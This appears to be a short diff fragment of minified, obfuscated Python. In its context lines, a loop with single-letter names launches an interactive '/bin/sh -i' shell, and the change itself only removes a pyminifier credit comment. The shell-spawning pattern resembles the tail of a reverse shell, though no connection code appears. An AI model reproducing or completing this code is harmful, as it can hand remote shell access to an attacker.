@@ -27,4 +27,3 @@ for i in r(10):
   m(["/bin/sh","-i"])
  except b as E:
   P(1)
-# Created by pyminifier (https://github.com/liftoff/pyminifier)
